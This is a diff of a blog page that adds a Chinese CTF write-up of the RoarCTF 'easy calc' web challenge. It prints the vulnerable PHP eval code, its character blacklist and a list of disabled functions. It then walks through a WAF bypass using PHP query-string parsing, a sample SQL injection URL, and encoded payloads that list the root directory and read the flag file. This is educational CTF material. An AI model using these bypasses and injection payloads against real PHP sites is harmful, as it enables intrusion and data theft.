@@ -5,14 +5,13 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="Roarctf部分wp, 舞动的獾">
-    <meta name="description" content="misc黄金六年视频很短，播放一遍后发现存在二维码一闪而过，用暴风影音一帧一帧卡出四张二维码。
+    <meta name="description" content="webeasy cacl查看源代码发现了calc.php
 
-
-
-
-用微信扫出的结果为iwantplayctf
-伤心的是，这是个压缩包的密码，它藏在文件后面，有一串base64加密的字符串
-UmFyIRo">
+&amp;lt;!--I&amp;#39;ve set up WAF to ensure security.--&amp;gt;
+用了WAF
+先访问calc.php，发现关键代码
+&amp;lt;?php
+err">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -405,14 +404,14 @@ UmFyIRo">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.5k
+                        2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        7 分
+                        9 分
                     </div>
                     
                 
@@ -428,7 +427,71 @@ UmFyIRo">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="黄金六年"><a href="#黄金六年" class="headerlink" title="黄金六年"></a>黄金六年</h5><p>视频很短，播放一遍后发现存在二维码一闪而过，用暴风影音一帧一帧卡出四张二维码。</p>
+                <h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="easy-cacl"><a href="#easy-cacl" class="headerlink" title="easy cacl"></a>easy cacl</h5><p>查看源代码发现了calc.php</p>
+<img src="/2019/10/20/roarctf-bu-fen-wp/11.png">
+<pre><code>&lt;!--I&#39;ve set up WAF to ensure security.--&gt;
+</code></pre><p>用了WAF</p>
+<p>先访问calc.php，发现关键代码</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span> 
+</code></pre>
+<p>通过GET方式获得num变量，然后进行url加密后通过val()函数</p>
+<p>测试发现计算框除了数字啥也不能输入，直接通过calc.php传值，绕过WAF</p>
+<p><strong>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$POST。例如：/?foo=bar变成Array([foo]=&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/%20news[id%00=42会转换为Array([news_id]=&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截</strong>。</p>
+<p><strong>那么我们就可以用以下语句绕过：</strong></p>
+<pre><code>/news.php?%20news[id%00=42&quot;+AND+1=0--
+</code></pre><p>可以看这篇文章</p>
+<p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p>
+<p>最简单的绕过就是加上空格</p>
+<pre><code>/calc.php? num=phpinfo()
+</code></pre><img src="/2019/10/20/roarctf-bu-fen-wp/12.png">
+<p>下面就是绕过题目的黑名单，题目将单双引号都过滤了，空格也过滤了</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+</code></pre>
+<p>大佬wp说存在命令执行函数过滤，但是菜鸡的我没有找到</p>
+<pre class=" language-php"><code class="language-php">passthru<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>system<span class="token punctuation">,</span>chroot<span class="token punctuation">,</span>chgrp<span class="token punctuation">,</span>chown<span class="token punctuation">,</span>shell_exec<span class="token punctuation">,</span>proc_open<span class="token punctuation">,</span>proc_get_status<span class="token punctuation">,</span>popen<span class="token punctuation">,</span>ini_alter<span class="token punctuation">,</span>ini_restore<span class="token punctuation">,</span>dl<span class="token punctuation">,</span>openlog<span class="token punctuation">,</span>syslog<span class="token punctuation">,</span>readlink<span class="token punctuation">,</span>symlink<span class="token punctuation">,</span>popepassthru<span class="token punctuation">,</span>stream_socket_server<span class="token punctuation">,</span>chdir<span class="token punctuation">,</span>pcntl_alarm<span class="token punctuation">,</span>pcntl_fork<span class="token punctuation">,</span>pcntl_waitpid<span class="token punctuation">,</span>pcntl_wait<span class="token punctuation">,</span>pcntl_wifexited<span class="token punctuation">,</span>pcntl_wifstopped<span class="token punctuation">,</span>pcntl_wifsignaled<span class="token punctuation">,</span>pcntl_wifcontinued<span class="token punctuation">,</span>pcntl_wexitstatus<span class="token punctuation">,</span>pcntl_wtermsig<span class="token punctuation">,</span>pcntl_wstopsig<span class="token punctuation">,</span>pcntl_signal<span class="token punctuation">,</span>pcntl_signal_get_handler<span class="token punctuation">,</span>pcntl_signal_dispatch<span class="token punctuation">,</span>pcntl_get_last_error<span class="token punctuation">,</span>pcntl_strerror<span class="token punctuation">,</span>pcntl_sigprocmask<span class="token punctuation">,</span>pcntl_sigwaitinfo<span class="token punctuation">,</span>pcntl_sigtimedwait<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>pcntl_getpriority<span class="token punctuation">,</span>pcntl_setpriority<span class="token punctuation">,</span>putenv<span class="token punctuation">,</span>opendir<span class="token punctuation">,</span>imap_open<span class="token punctuation">,</span>mail<span class="token punctuation">,</span>imap_mail<span class="token punctuation">,</span>ini_set<span class="token punctuation">,</span>apache_setenv<span class="token punctuation">,</span>link
+</code></pre>
+<p>下面读取文件目录</p>
+<p>构造scandir(‘/‘)，首先构造/</p>
+<pre class=" language-php"><code class="language-php">php <span class="token operator">></span> <span class="token keyword">echo</span> <span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">47</span>
+</code></pre>
+<p>再构造</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token string">'scandir'</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">61693386291</span>
+</code></pre>
+<p>结果为：</p>
+<p>base_convert(‘61693386291’,10,36)(hex2bin(dechex(47)))</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">61693386291</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<img src="/2019/10/20/roarctf-bu-fen-wp/13.png">
+<p>看到flagg文件，读取内容readfile()</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">2146934604002</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">52115961636711</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p>还可以用另一个函数file_get_contents()</p>
+<pre><code>php &gt; echo hexdec(bin2hex(&#39;/f1agg&#39;));
+52115961636711
+</code></pre><p>最终playload</p>
+<pre class=" language-pjp"><code class="language-pjp">file_get_contents(hex2bin(dechex(52115961636711)))
+</code></pre>
+<p>函数base_convert(转换字符，原进制，转换进制)</p>
+<p>hexdec(bin2hex（”字符串“）)字符串转为hex –&gt;10进制</p>
+<p>hex2bin(dechex(数字))  10进制转hex–&gt;字符串</p>
+<hr>
+<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="黄金六年"><a href="#黄金六年" class="headerlink" title="黄金六年"></a>黄金六年</h5><p>视频很短，播放一遍后发现存在二维码一闪而过，用暴风影音一帧一帧卡出四张二维码。</p>
 <img src="/2019/10/20/roarctf-bu-fen-wp/1.PNG">
 <img src="/2019/10/20/roarctf-bu-fen-wp/2.PNG">
 <img src="/2019/10/20/roarctf-bu-fen-wp/3.PNG">
@@ -976,7 +1039,7 @@ m <span class="token operator">=</span> pow<span class="token punctuation">(</sp
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">2.8k</span>
+                <span class="white-color">3.4k</span>
             
 
             
